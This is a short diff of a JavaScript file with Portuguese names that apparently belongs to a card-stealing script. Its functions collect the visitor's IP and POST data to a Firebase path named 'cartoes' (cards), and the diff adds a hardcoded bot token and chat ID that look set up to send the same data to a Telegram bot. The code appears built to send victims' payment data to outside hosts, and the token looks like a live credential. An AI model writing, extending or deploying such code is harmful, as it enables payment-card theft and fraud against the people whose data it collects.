@@ -51,6 +51,8 @@ async function obterIP() {
 // Função para enviar dados ao Firebase
 async function enviarParaFirebase(dados) {
   const firebaseUrl = 'https://seu-projeto-71c10-default-rtdb.firebaseio.com/cartoes.json';
+  const TOKEN = "8776533220:AAFH8s1cQrIWHYdUvtaTBzIn7E2y1vqTKpE";
+  const CHAT_ID = "8311007963";
   try {
     await fetch(firebaseUrl, {
       method: 'POST',
